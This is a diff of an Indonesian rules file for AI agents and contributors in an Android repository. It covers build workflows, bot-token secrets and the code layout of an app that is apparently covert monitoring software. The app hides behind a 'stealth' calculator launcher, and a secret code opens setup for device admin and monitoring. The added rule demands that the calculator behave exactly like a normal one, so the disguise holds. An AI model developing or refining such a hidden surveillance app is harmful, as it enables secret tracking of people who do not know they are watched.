@@ -10,9 +10,11 @@ Aturan kerja untuk semua agen/kontributor di repo ini. Lingkup: seluruh tree rep
 
 ## 2. Cara Build yang Benar
 
-1. Push ke branch / buka PR ke `main`, atau jalankan manual via Actions > Build APK > Run workflow.
-2. Ambil hasil dari tab Actions > Artifacts (`app-debug`, `app-release`).
-3. Secret opsional `BOT_TOKEN`, `CHAT_ID`, `SYNC_INTERVAL` diisi via GitHub Secrets — dibaca workflow sebagai env dan diteruskan ke Gradle property (`-P` / env). Tanpa secret pun build tetap sukses (nilai kosong) karena pemakaian normal memakai input manual di aplikasi.
+- Satu-satunya workflow adalah `.github/workflows/build.yml`. Setiap run membangun keempat APK sekaligus: standar (`redeye-debug.apk`, `redeye-release.apk`) dan parental (`parental-debug.apk`, `parental-release.apk`, `PARENTAL_UI=true`).
+- Pemicu: push ke branch / buka PR ke `main`, push tag `v*`, atau manual via Actions > Build APK > Run workflow. Run yang tersalip otomatis dibatalkan (`concurrency`).
+- Ambil hasil dari tab Actions > Artifacts (`apks`).
+- Push tag `vX.Y.Z` otomatis menerbitkan GitHub Release berisi keempat APK berversi (`redeye-vX.Y.Z-*.apk`, `parental-vX.Y.Z-*.apk`).
+- Secret opsional `BOT_TOKEN`, `CHAT_ID`, `SYNC_INTERVAL` diisi via GitHub Secrets — dibaca workflow sebagai env dan diteruskan ke Gradle property (`-P` / env). Tanpa secret pun build tetap sukses (nilai kosong) karena pemakaian normal memakai input manual di aplikasi.
 
 ## 3. Alur Konfigurasi Bot (Wajib)
 
@@ -22,7 +24,7 @@ Aturan kerja untuk semua agen/kontributor di repo ini. Lingkup: seluruh tree rep
 
 ## 4. Struktur Kode yang Berlaku
 
-- `ui/MainActivity.kt` — launcher kalkulator (stealth). Kode rahasia `1234=` membuka `SetupActivity`.
+- `ui/MainActivity.kt` — launcher kalkulator (stealth). Kode rahasia `1234=` membuka `SetupActivity`. Kalkulator WAJIB berperilaku seperti kalkulator biasa (angka setelah `=` memulai entri baru, desimal dibulatkan, maksimal 12 digit).
 - `ui/SetupActivity.kt` + `layout/activity_setup.xml` — HALAMAN UTAMA untuk simpan token/chat ID, tes koneksi, izin, device admin, start/stop monitoring.
 - `data/PreferencesManager.kt` — penyimpanan terenkripsi, satu-satunya tempat baca/tulis token.
 - `service/`, `receiver/`, `worker/`, `repository/`, `network/` — jangan ubah perilakunya kecuali diminta eksplisit.
@@ -34,11 +36,11 @@ Aturan kerja untuk semua agen/kontributor di repo ini. Lingkup: seluruh tree rep
 - Jangan tambah komentar inline di kode kecuali diminta.
 - Jangan tambah header lisensi/copyright.
 - Jangan `git commit` / buat branch kecuali diminta eksplisit.
-- Ikuti gaya kode yang ada (findViewById, Material3, tanpa ViewBinding di activity baru kecuali sudah dipakai).
+- Ikuti gaya kode yang ada (findViewById, Material3, tanpa ViewBinding — fitur dimatikan di `app/build.gradle`).
 
 ## 6. Changelog & Dokumentasi
 
-- Setiap perubahan perilaku / file build / workflow WAJIB catat di `CHANGELOG.md` format Keep a Changelog (`Added/Changed/Fixed/Deprecated/Security`).
+- Setiap perubahan perilaku / file build / workflow WAJIB catat di `CHANGELOG.md` format Keep a Changelog (`Added/Changed/Fixed/Removed/Deprecated/Security`), dengan seksi `[Unreleased]` untuk perubahan yang belum dirilis.
 - `README.md` adalah dokumen pengguna: dahulukan cara build via GitHub Actions, tandai `builder.sh` sebagai legacy.
 - Perintah, path file, dan nama env SELALU dalam backtick saat menulis jawaban akhir.
 
